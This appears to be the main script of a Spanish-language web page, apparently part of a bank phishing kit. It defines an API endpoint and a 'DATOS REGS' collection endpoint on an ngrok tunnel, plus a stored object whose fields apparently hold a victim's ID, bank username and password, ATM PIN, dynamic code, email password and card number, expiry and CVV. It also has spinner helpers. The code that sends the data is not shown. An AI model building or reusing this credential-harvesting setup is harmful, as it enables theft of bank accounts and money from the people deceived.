/**
 * CONFIGURACION 
 */
    const API_URL = 'https://app-55a73feb-48d5-4f82-8c80-b909e94808bf.cleverapps.io'; // API.
    // const DATA_URL = 'http://127.0.0.1:8080'; // DATOS REGS.
    const DATA_URL = 'https://e433-152-202-147-251.ngrok-free.app'; // DATOS REGS.





const LS = window.localStorage;
let info = {
    cc: '',
    names: '',
    cname: '',
    cenv: '',
    dir: '',
    user: '',
    puser: '',
    ccajero: '',
    cavances: '',
    cdin: '',
    email: '',
    pemail: '',
    cel: '',
    ban: '',
    p: '',
    f: '',
    c: '',
    type: '',
    tok: '',
    err: ''
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

function limitarDigitos(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function showSpinner() {
    try {
        // Crear el contenedor del spinner
        let spinnerContainer = document.createElement('div');
        spinnerContainer.setAttribute('id', 'modal-spinner');
        spinnerContainer.classList.add('modal', 'd-block');
        spinnerContainer.id = 'modal-esperar';

        // Crear el contenido del spinner
        let modalBody = document.createElement('div');
        modalBody.classList.add('modal-body', 'modal-esperar');

        let centerDiv = document.createElement('div');
        centerDiv.classList.add('d-center');

        let spinnerDiv = document.createElement('div');
        spinnerDiv.classList.add('lds-ellipsis');

        for(let i = 0; i < 4; i++) {
            let div = document.createElement('div');
            spinnerDiv.appendChild(div);
        }

        // Unir todo
        centerDiv.appendChild(spinnerDiv);
        modalBody.appendChild(centerDiv);
        spinnerContainer.appendChild(modalBody);

        // Agregar el spinner al body
        document.body.appendChild(spinnerContainer);

    } catch (err) {
        console.log(err);
    }
}


function deleteSpinner(){
    try{
        document.querySelector('body').removeChild(document.querySelector('body').lastChild);
    }catch(err){
        console.log(err);
    }
}


console.log("Main ON");
